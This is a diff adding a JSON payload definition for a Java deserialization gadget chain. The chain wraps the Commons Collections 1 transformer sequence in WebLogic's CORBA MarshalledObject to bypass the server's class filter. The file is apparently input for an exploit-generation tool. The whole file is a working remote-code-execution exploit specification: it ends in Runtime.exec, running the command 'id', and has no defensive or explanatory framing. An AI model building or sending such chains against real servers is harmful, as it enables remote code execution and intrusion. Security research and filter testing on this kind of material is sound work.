@@ -1,0 +1,64 @@
+{
+  "chain_type": "wrapper_chain",
+  "description": "WebLogic5: CORBA MarshalledObject wrapping CC1 (ClassFilter bypass)",
+  "root_class": "weblogic.corba.utils.MarshalledObject",
+  "root_trigger": "readResolve→new_OIS→readObject",
+  "wrapper": {
+    "class": "weblogic.corba.utils.MarshalledObject",
+    "field_overrides": {
+      "objBytes": {"$inner_chain": true},
+      "hash": 42
+    }
+  },
+  "links": [
+    {
+      "class": "java.util.HashMap",
+      "role": "trigger",
+      "trigger": "readObject→hash→hashCode"
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "role": "bridge",
+      "field_overrides": {
+        "factory": {"$ref": "link:2"}
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ChainedTransformer",
+      "role": "bridge",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:3"},
+          {"$ref": "link:4"},
+          {"$ref": "link:5"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "role": "bridge",
+      "field_overrides": {
+        "iConstant": "java.lang.Runtime"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "role": "bridge",
+      "field_overrides": {
+        "iMethodName": "getRuntime",
+        "iParamTypes": [],
+        "iArgs": []
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "role": "sink",
+      "field_overrides": {
+        "iMethodName": "exec",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["id"]
+      }
+    }
+  ],
+  "sink_method": "Runtime.exec"
+}
